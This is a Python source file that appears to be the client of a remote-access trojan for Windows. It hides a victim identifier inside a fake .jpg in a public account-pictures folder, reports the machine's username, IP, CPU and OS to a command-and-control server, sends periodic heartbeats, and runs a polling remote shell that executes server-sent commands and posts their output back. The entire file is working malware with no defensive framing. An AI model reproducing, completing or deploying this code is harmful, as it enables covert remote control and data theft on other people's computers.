# -*-coding:utf-8-*-
# cython:language_level=3
import getpass
import json
import os
import platform
import random
import socket
import string
import threading
import time
import subprocess
import requests

ServerIP = ""
Cookie_admin = None
flag = False


def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))


def get_host_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        whoa_ip = s.getsockname()[0]
    finally:
        s.close()
    return whoa_ip


def CookieIF():
    global Cookie_admin
    global flag
    target_folder = "C:\\Users\\Public\\AccountPictures\\S-1-5-21-638547129-307165535-183523732-1002"
    file_path = os.path.join(target_folder, "R-Cadimn.jpg")
    if os.access(file_path, os.F_OK):
        with open(file_path, 'rb') as file:
            lines = file.readlines()
            Cookie_admin = lines[-1].decode('utf-8').strip()
            flag = True
    else:
        if not os.path.exists(target_folder):
            os.mkdir(target_folder)
        with open("_internal\\R-Cadimn.jpg", "rb") as r:
            with open(file_path, "wb") as f:
                f.write(r.read())


def Cookie():
    global Cookie_admin
    CookieIF()
    global flag
    if Cookie_admin and flag:
        return Cookie_admin
    else:
        Cookie_admin = platform.system() + "_" + get_host_ip() + "_" + generate_random_string(7)
        with open("C:\\Users\\Public\\AccountPictures\\S-1-5-21-638547129-307165535-183523732-1002\\R-Cadimn.jpg",
                  "a") as f:
            f.write("\n" + Cookie_admin)
        flag = True
        return Cookie_admin


def CommandStart(s):
    print(s)
    result = subprocess.run(s, shell=True, capture_output=True, text=True)
    b = result.stdout
    requests.post(f"http://{ServerIP}:5264/api/ShellOsHttp/Input", data=b)


def ShellOsHttp():
    while True:
        command = requests.post(f"http://{ServerIP}:5264/api/ShellOsHttp", data=Cookie(), timeout=None).text
        thread = threading.Thread(target=CommandStart, args=(command,))
        thread.start()


def HeartbeatHttp():
    while True:
        requests.post(f"http://{ServerIP}:5264/api/HeartbeatHttp", data=Cookie())
        time.sleep(180)


def InitServer():
    data = json.dumps({'WhoamiName': Cookie(), 'sysPath': os.path.abspath(__file__), 'systemName': platform.system(),
                       'Cpu': platform.processor(), 'Cpuarchitecture': platform.machine(), 'IP': get_host_ip(),
                       'AdminName': getpass.getuser()},
                      sort_keys=True, indent=4, separators=(',', ': '))
    print(data)
    requests.post(f"http://{ServerIP}:5264/api/init/cookie", data=data)
    return
